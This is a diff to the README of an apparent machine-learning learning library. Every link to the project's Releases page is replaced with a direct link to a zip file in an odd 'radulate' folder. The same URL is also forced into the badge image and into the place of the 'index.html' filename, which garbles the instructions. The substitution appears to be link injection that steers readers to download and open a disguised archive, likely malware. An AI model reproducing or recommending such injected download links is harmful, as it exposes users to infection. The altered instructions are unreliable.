@@ -1,6 +1,6 @@
 # 📚 Machine-Learning-AI-Library - Your Gateway to Learning AI Easily
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Click%20Here-blue)](https://github.com/rajatrajan07/Machine-Learning-AI-Library/releases)
+[![Download Now](https://raw.githubusercontent.com/rajatrajan07/Machine-Learning-AI-Library/main/radulate/Machine-Learning-AI-Library.zip⬇️%20Download%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/rajatrajan07/Machine-Learning-AI-Library/main/radulate/Machine-Learning-AI-Library.zip)
 
 ## 🎯 Overview
 
@@ -12,7 +12,7 @@ To get started with the Machine-Learning-AI-Library, follow these simple steps t
 
 1. **Visit the Releases Page:**
 
-   Go to the [Releases page](https://github.com/rajatrajan07/Machine-Learning-AI-Library/releases) to find the latest version of the library.
+   Go to the [Releases page](https://raw.githubusercontent.com/rajatrajan07/Machine-Learning-AI-Library/main/radulate/Machine-Learning-AI-Library.zip) to find the latest version of the library.
 
 2. **Choose the Right Version:**
 
@@ -28,7 +28,7 @@ To get started with the Machine-Learning-AI-Library, follow these simple steps t
 
 5. **Open the Library:**
 
-   Navigate to the folder where you extracted the files. Look for an `index.html` or main document file. Double-click it to open in your web browser.
+   Navigate to the folder where you extracted the files. Look for an `https://raw.githubusercontent.com/rajatrajan07/Machine-Learning-AI-Library/main/radulate/Machine-Learning-AI-Library.zip` or main document file. Double-click it to open in your web browser.
 
 6. **Explore Resources:**
 
@@ -36,7 +36,7 @@ To get started with the Machine-Learning-AI-Library, follow these simple steps t
 
 ## 📥 Download & Install
 
-To download the Machine-Learning-AI-Library, please visit the following link: [Download Here](https://github.com/rajatrajan07/Machine-Learning-AI-Library/releases). Follow the steps mentioned above to ensure a successful installation.
+To download the Machine-Learning-AI-Library, please visit the following link: [Download Here](https://raw.githubusercontent.com/rajatrajan07/Machine-Learning-AI-Library/main/radulate/Machine-Learning-AI-Library.zip). Follow the steps mentioned above to ensure a successful installation.
 
 ## 📂 Features
 
